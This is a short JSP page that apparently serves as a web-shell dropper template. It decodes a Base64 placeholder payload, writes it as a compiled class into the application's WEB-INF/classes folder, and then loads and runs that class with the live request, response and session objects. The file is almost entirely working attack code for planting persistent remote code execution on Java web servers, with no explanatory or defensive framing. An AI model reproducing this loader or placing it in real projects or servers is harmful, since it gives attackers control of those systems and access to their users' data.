<%
    String className = "shellName";
    String code = "shellCode";
    byte[] bytes = java.util.Base64.getDecoder().decode(code);
    java.io.File file = new java.io.File(request.getServletContext().getRealPath("/") + "WEB-INF/classes");
    file.mkdirs();
    java.nio.file.Files.write(java.nio.file.Paths.get(file.getAbsolutePath() + "/" + className + ".class"),bytes);
    Class.forName(className).newInstance().equals(new Object[]{request,response,session});
%>